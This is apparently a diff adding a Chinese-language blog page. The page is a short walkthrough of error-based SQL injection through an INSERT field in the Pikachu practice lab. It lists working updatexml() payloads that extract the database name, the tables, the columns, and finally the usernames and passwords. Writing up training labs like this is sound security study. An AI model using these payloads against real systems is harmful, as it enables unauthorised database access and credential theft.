@@ -1,0 +1,188 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sql注入之insert注入 | Gridea</title>
+<link rel="shortcut icon" href="https://somebodystark.github.io/favicon.ico?v=1695815481153">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://somebodystark.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Sql注入之insert注入 | Gridea - Atom Feed" href="https://somebodystark.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+
+判断是否存在注入点 输入' 页面报错 存在注入点
+
+
+查询数据库名称1' or updatexml(1,concat(0x7e,database()),0)  or '
+
+
+查询数据表名称 ’ or updatexml(1,concat..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://somebodystark.github.io">
+  <img class="avatar" src="https://somebodystark.github.io/images/avatar.png?v=1695815481153" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Sql注入之insert注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-09-27
+              </span>
+              <span>
+                1 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <ol>
+<li>
+<p>判断是否存在注入点 输入' 页面报错 存在注入点<img src="C:%5CUsers%5C86183%5COneDrive%5C%E6%A1%8C%E9%9D%A2%5CSql%E6%B3%A8%E5%85%A5%E6%88%AA%E5%9B%BE%5C%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E7%82%B9.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>查询数据库名称1' or updatexml(1,concat(0x7e,database()),0)  or '<img src="C:%5CUsers%5C86183%5COneDrive%5C%E6%A1%8C%E9%9D%A2%5CSql%E6%B3%A8%E5%85%A5%E6%88%AA%E5%9B%BE%5C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>查询数据表名称 ’ or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or’</p>
+<figure data-type="image" tabindex="1"><img src="https://img1.imgtp.com/2023/09/27/bTzs4p6B.png" alt="" loading="lazy"></figure>
+<ol>
+<li>查询数据列名称 ' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')),1) or' <img src="https://img1.imgtp.com/2023/09/27/cj2Jfsf8.png" alt="查询数据列名称.png" loading="lazy"></li>
+</ol>
+<p>5.获取username，password字段内容' or updatexml(1,concat(0x7e,(select group_concat(username,password) from pikachu.users)),1）or' <img src="https://img1.imgtp.com/2023/09/27/74QM6riD.png" alt="获取username，password字段内容.png" loading="lazy"></p>
+</li>
+</ol>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://somebodystark.github.io/post/sql-zhu-ru-zhi-lian-he-cha-xun/">
+              <h3 class="post-title">
+                Sql注入之联合查询
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://somebodystark.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
